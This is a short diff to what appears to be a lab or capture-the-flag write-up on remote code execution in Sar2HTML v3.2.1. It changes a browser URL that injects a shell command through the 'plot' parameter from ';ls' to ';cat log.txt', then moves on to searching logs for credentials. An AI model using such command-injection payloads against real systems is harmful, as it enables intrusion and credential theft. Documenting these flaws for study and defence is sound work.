@@ -56,7 +56,7 @@ Sar2HTML v3.2.1 is vulnerable to Remote Code Execution via the ```plot``` URL pa
 1. Test command execution directly in the browser:
 
 ```bash
-      http://10.49.160.244/joomla/_test/index.php?plot=;ls
+      http://10.49.160.244/joomla/_test/index.php?plot=;cat log.txt
 ```
 2. Inspect log files for sensitive credentials by viewing page source:
 
